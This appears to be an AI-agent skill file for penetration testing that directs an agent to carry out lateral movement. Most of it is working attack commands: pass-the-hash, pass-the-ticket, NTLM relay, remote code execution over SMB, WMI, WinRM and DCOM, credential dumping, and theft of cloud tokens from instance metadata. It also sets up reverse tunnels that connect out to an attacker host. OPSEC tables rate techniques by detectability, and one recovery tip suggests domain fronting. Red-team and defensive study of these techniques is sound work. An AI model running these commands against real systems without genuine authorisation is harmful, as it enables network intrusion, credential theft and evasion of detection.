---
name: lateral-movement
description: Validate and execute lateral movement across Windows, Linux, Active Directory, and cloud environments using discovered credentials. Pivot through network segments with tunneling.
---

# Lateral Movement Skill (TA0008)

## Overview
Validate and execute lateral movement across Windows, Linux, Active Directory, and cloud
environments using discovered credentials. Pivot through network segments with tunneling.
Operate within explicit scope with minimal footprint.

## Scope Rules
1. Only move to explicitly in-scope hosts (or approved scope expansion).
2. External targets: lateral movement requires explicit authorization (external_exploit=explicit_only).
3. Use a single authentication attempt per host unless explicitly authorized.
4. Avoid persistence or long-lived pivots without approval.
5. Document every hop with timestamps and credential used.

---

## Decision Tree: Choosing Lateral Movement Technique

```
START → What credentials do you have?
├── Cleartext Password
│   ├── Windows target → PsExec, WMI, WinRM, RDP, DCOM, scheduled tasks
│   ├── Linux target → SSH, ansible
│   └── Cloud → Console login, CLI auth, role assumption
├── NTLM Hash (no password)
│   ├── Windows → Pass-the-Hash: wmiexec, smbexec, psexec, evil-winrm -H
│   ├── NTLM relay available → ntlmrelayx to target services
│   └── Crack first → hashcat -m 1000 then use password
├── Kerberos Ticket (TGT/TGS)
│   ├── Pass-the-Ticket → export + inject with Rubeus/impacket
│   ├── Overpass-the-Hash → NTLM hash → request TGT → use Kerberos auth
│   └── S4U delegation abuse → impersonate any user to target SPN
├── SSH Key
│   ├── Direct → ssh -i key user@target
│   ├── Agent forwarding → ssh -A (caution: agent hijackable)
│   └── ProxyJump → ssh -J jump_host user@target
├── Cloud Token / API Key
│   ├── AWS → aws sts assume-role, cross-account pivot
│   ├── Azure → az login with token, managed identity
│   └── GCP → gcloud auth activate-service-account
└── No credentials yet
    ├── Network position → LLMNR poison, NTLM relay, ARP spoof
    ├── Accessible services → default creds, anonymous access
    └── Internal phishing → if authorized
```

### Network Position Check
```
What's your network position?
├── Same subnet → Direct connection to target ports
├── Different subnet (no route) → Need pivot/tunnel
│   ├── Have SSH to jump host → SSH port forwarding or SOCKS proxy
│   ├── Have shell on pivot → chisel, ligolo-ng, socat relay
│   └── Have Meterpreter → autoroute + socks proxy
└── Cloud environment → Security group/NSG rules, VPC peering, service endpoints
```

---

## Methodology

### 1. Windows Lateral Movement

#### PsExec (SMB — port 445)
```
# Impacket PsExec — creates service, uploads binary, returns SYSTEM shell
impacket-psexec domain/user:pass@<TARGET>
impacket-psexec -hashes :NTHASH domain/user@<TARGET>

# SysInternals PsExec
psexec.exe \\<TARGET> -u domain\user -p pass cmd.exe
psexec.exe \\<TARGET> -u domain\user -p pass -s cmd.exe   # SYSTEM
```

#### WMI (port 135 + dynamic high ports)
```
# Impacket wmiexec — executes via WMI, semi-interactive shell
impacket-wmiexec domain/user:pass@<TARGET>
impacket-wmiexec -hashes :NTHASH domain/user@<TARGET>

# From Windows
wmic /node:<TARGET> /user:domain\user /password:pass process call create "cmd.exe /c whoami > C:\Temp\out.txt"
```

#### WinRM (port 5985/5986)
```
# Evil-WinRM — full interactive PowerShell shell
evil-winrm -i <TARGET> -u user -p pass
evil-winrm -i <TARGET> -u user -H NTHASH
evil-winrm -i <TARGET> -u user -p pass -s /scripts/ -e /exes/

# PowerShell native
Enter-PSSession -ComputerName <TARGET> -Credential domain\user
Invoke-Command -ComputerName <TARGET> -ScriptBlock { whoami } -Credential domain\user
```

#### RDP (port 3389)
```
xfreerdp /u:user /p:pass /v:<TARGET>:3389 /dynamic-resolution
xfreerdp /u:user /pth:NTHASH /v:<TARGET>:3389    # Pass-the-Hash RDP (restricted admin)
xfreerdp /u:user /p:pass /v:<TARGET> /drive:share,/tmp   # Mount local folder

# Enable RDP remotely (if admin)
crackmapexec smb <TARGET> -u user -p pass -M rdp -o ACTION=enable
```

#### DCOM (port 135 + dynamic)
```
impacket-dcomexec domain/user:pass@<TARGET>
impacket-dcomexec -hashes :NTHASH domain/user@<TARGET>
# Uses MMC20.Application, ShellBrowserWindow, or ShellWindows DCOM objects
```

#### SCM / SMBExec (port 445)
```
impacket-smbexec domain/user:pass@<TARGET>
impacket-smbexec -hashes :NTHASH domain/user@<TARGET>
# Creates Windows service to execute commands — no binary upload
```

#### Scheduled Tasks
```
# Remote scheduled task creation
schtasks /create /s <TARGET> /u domain\user /p pass /tn "TaskName" /tr "cmd.exe /c whoami > C:\Temp\out.txt" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s <TARGET> /u domain\user /p pass /tn "TaskName"
schtasks /delete /s <TARGET> /u domain\user /p pass /tn "TaskName" /f

# Impacket atexec
impacket-atexec domain/user:pass@<TARGET> 'whoami'
```

### 2. Linux Lateral Movement

```
# SSH with password
sshpass -p 'password' ssh user@<TARGET>

# SSH with key
ssh -i /path/to/id_rsa user@<TARGET>

# SSH ProxyJump (multi-hop)
ssh -J user@jumphost user@<TARGET>
# Or in ~/.ssh/config:
# Host internal
#   HostName 10.10.10.5
#   User admin
#   ProxyJump user@jumphost

# SSH agent forwarding (use carefully — agent can be hijacked)
ssh -A user@jumphost
ssh user@<TARGET>    # from jumphost, uses forwarded agent

# Ansible ad-hoc (if ansible available)
ansible -i "target," all -m shell -a "whoami" -u user --ask-pass
ansible-playbook -i "target," playbook.yml -u user -k
```

### 3. Active Directory Lateral Movement

#### Pass-the-Hash
```
# Use NTLM hash directly — no password needed
impacket-wmiexec -hashes :NTHASH domain/user@<TARGET>
impacket-psexec -hashes :NTHASH domain/user@<TARGET>
impacket-smbexec -hashes :NTHASH domain/user@<TARGET>
evil-winrm -i <TARGET> -u user -H NTHASH
crackmapexec smb <TARGET> -u user -H NTHASH -x 'whoami'
```

#### Pass-the-Ticket
```
# Export ticket
Rubeus.exe dump /nowrap
# Or from Linux: export KRB5CCNAME=/tmp/ticket.ccache

# Inject and use
Rubeus.exe ptt /ticket:<base64_ticket>
# Impacket with Kerberos
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain/user@<TARGET>
impacket-wmiexec -k -no-pass domain/user@<TARGET>
```

#### Overpass-the-Hash (NTLM → Kerberos TGT)
```
# Request TGT using NTLM hash, then use Kerberos auth
Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
impacket-getTGT -hashes :NTHASH domain/user
export KRB5CCNAME=user.ccache
```

#### NTLM Relay
```
# Relay captured NTLM auth to another target
impacket-ntlmrelayx -t smb://<TARGET> -smb2support -i    # interactive SMB shell
impacket-ntlmrelayx -t ldap://<DC_IP> --escalate-user user  # AD privilege escalation
# Trigger auth: use Responder, PetitPotam, PrinterBug, etc.
```

### 4. Pivoting and Tunneling

#### SSH Port Forwarding
```
# Local port forward — access TARGET:PORT through JUMPHOST
ssh -L 8080:TARGET:80 user@JUMPHOST
# Now: curl http://localhost:8080 → hits TARGET:80

# Remote port forward — expose local service to JUMPHOST
ssh -R 9090:localhost:80 user@JUMPHOST
# JUMPHOST:9090 → your localhost:80

# Dynamic SOCKS proxy — route any traffic through JUMPHOST
ssh -D 1080 user@JUMPHOST
# Configure proxychains: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn TARGET
```

#### Chisel (HTTP tunnel — firewall bypass)
```
# On attacker (server)
chisel server --reverse --port 8080

# On pivot host (client) — reverse SOCKS proxy
chisel client ATTACKER:8080 R:1080:socks

# On pivot host — forward specific port
chisel client ATTACKER:8080 R:445:TARGET:445
```

#### Ligolo-ng (TUN-based — full network access)
```
# On attacker — start proxy
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert

# On pivot host — connect agent
ligolo-agent -connect ATTACKER:11601 -ignore-cert

# In ligolo proxy console
>> session           # select agent session
>> ifconfig          # show pivot host interfaces
>> start             # start tunnel
# Add route on attacker
sudo ip route add 10.10.10.0/24 dev ligolo
# Now access internal network directly — no proxychains needed
```

#### Socat Relay
```
# Port forward
socat TCP-LISTEN:8080,fork TCP:TARGET:80

# Encrypted relay
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:TARGET:80
```

#### Meterpreter Pivoting
```
# Add route through session
run autoroute -s 10.10.10.0/24
run autoroute -p    # print routes

# Start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j

# Use with proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
```

#### sshuttle (transparent proxy)
```
# Route all traffic to subnet through SSH
sshuttle -r user@JUMPHOST 10.10.10.0/24
sshuttle -r user@JUMPHOST 10.10.10.0/24 --dns   # include DNS
```

### 5. Cloud Lateral Movement

```
# AWS — cross-account role assumption
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT_ID:role/RoleName --role-session-name pivot
# Use returned credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# AWS — metadata service pivot (from compromised instance)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# Use instance role creds to enumerate other services, S3, Lambda, etc.

# Azure — managed identity → access other resources
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Use token with az cli or REST API
az account get-access-token --resource https://vault.azure.net

# Azure — service principal abuse
az login --service-principal -u <APP_ID> -p <SECRET> --tenant <TENANT>
az role assignment list --assignee <APP_ID>

# GCP — service account impersonation
gcloud auth activate-service-account --key-file=sa-key.json
gcloud compute instances list --project <PROJECT>
# Metadata pivot
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

---

## OPSEC Ratings Per Technique

| Technique | OPSEC | Detection Signature |
|-----------|-------|---------------------|
| SSH (key-based) | 🟢 Quiet | auth.log entry, normal traffic |
| WinRM (PowerShell remoting) | 🟢 Quiet | Event 4624 type 3, encrypted |
| WMI (wmiexec) | 🟡 Moderate | Event 4648, WMI activity logs |
| DCOM | 🟡 Moderate | Event 4624, DCOM object creation |
| Pass-the-Hash (any) | 🟡 Moderate | Event 4624 type 3 + 4625 on failure |
| PsExec (impacket) | 🔴 Loud | Service creation event 7045, binary upload, EDR alert |
| PsExec (SysInternals) | 🔴 Loud | PSEXESVC service, admin share access |
| RDP | 🟡 Moderate | Event 4624 type 10, visual session |
| NTLM Relay | 🔴 Loud | Responder traffic, relay signatures |
| Chisel/Ligolo tunnel | 🟡 Moderate | HTTP tunnel traffic, unusual connections |
| sshuttle | 🟢 Quiet | Normal SSH traffic |

## Failure Recovery

| Technique | Common Failure | Recovery |
|-----------|---------------|----------|
| PsExec | Access denied (445 blocked) | Try WMI (135), WinRM (5985), DCOM (135) |
| WinRM | Not enabled / port closed | Enable remotely: `crackmapexec smb TARGET -u user -p pass -M winrm -o ACTION=enable` |
| SSH | Key rejected | Check authorized_keys, try password auth, check AllowUsers directive |
| Pass-the-Hash | "Account restrictions" | Try PTH with wmiexec/smbexec instead, or overpass-the-hash (NTLM→TGT) |
| RDP | NLA required, no creds | Use xfreerdp `/pth:` with restricted admin, or disable NLA remotely |
| Chisel | Blocked by proxy | Try different port (443, 8080), use domain fronting |
| NTLM relay | SMB signing required | Target LDAP instead, or find hosts without signing |
| Kerberos ticket | Clock skew | Sync time: `ntpdate DC_IP` or `net time /set /domain` |

## Technique Chaining Playbooks

### Credential → Multi-Host Takeover
```
1. Validate creds 🟢 (crackmapexec smb TARGETS -u user -p pass)
   └── Identify which hosts accept creds
2. Check admin access 🟡 (crackmapexec smb TARGETS -u user -p pass --shares)
   └── Admin on target? → wmiexec for shell
3. Dump creds on new host 🟡 (secretsdump.py)
   └── New creds found? → Repeat from step 1
4. Establish persistent pivot 🟡 (chisel/ligolo for new subnet)
   └── New subnet accessible → discovery skill
```

### Pivoting Through Segmented Network
```
1. Enumerate from current position 🟢 (ip route, arp -a)
2. Identify pivot host with dual-homed NIC 🟢
3. SSH dynamic forward 🟢 (ssh -D 1080 pivothost)
4. Scan new subnet through proxy 🟡 (proxychains nmap)
5. Move laterally in new subnet 🟡 (proxychains wmiexec)
   └── New access → credential_access → repeat
```

## Examples
See [examples/pth-lateral-chain.md](examples/pth-lateral-chain.md) for pass-the-hash lateral movement chain.
See [examples/chisel-pivot.md](examples/chisel-pivot.md) for chisel tunnel setup and usage.
See [examples/winrm-remote-exec.md](examples/winrm-remote-exec.md) for WinRM remote execution.

---

## Deep Dives
Load references when needed:
1. Windows lateral movement: `references/windows_lateral.md`
2. Linux lateral movement: `references/linux_lateral.md`
3. AD lateral techniques: `references/ad_lateral.md`
4. Pivoting and tunneling: `references/pivoting.md`
5. Cloud lateral movement: `references/cloud_lateral.md`

## Evidence Collection
1. `lateral.json` — host and access summaries with timestamps
2. `evidence.json` — method used, credential type, proof of access
3. `findings.json` — impact notes and attack path documentation
4. `handoff.json` — interactive commands for GUI shell handoff (SSH/WinRM/RDP/etc)

## Evidence Consolidation
Use `summarize_movement_log.py` to convert movement logs into `lateral.json`.

## OPSEC Considerations
- PsExec creates a service and uploads binary — leaves artifacts, detected by EDR
- WMI/DCOM execution is stealthier but still generates event logs (4648, 4624)
- WinRM requires membership in Remote Management Users (or admin)
- SSH agent forwarding exposes keys to compromised jump hosts
- Chisel/ligolo HTTP tunnels can bypass firewall rules but generate unusual traffic
- PTH generates event 4624 type 3 + 4625 on failure — can trigger alerts
- NTLM relay requires specific SMB signing configurations (signing disabled/not required)

## Success Criteria
- Movement paths validated within explicit scope
- Multiple technique options documented per target
- Pivot tunnels established and tested where needed
- Evidence captured with timestamps and credential attribution
- MITRE techniques tagged per finding
- No unauthorized persistence or changes
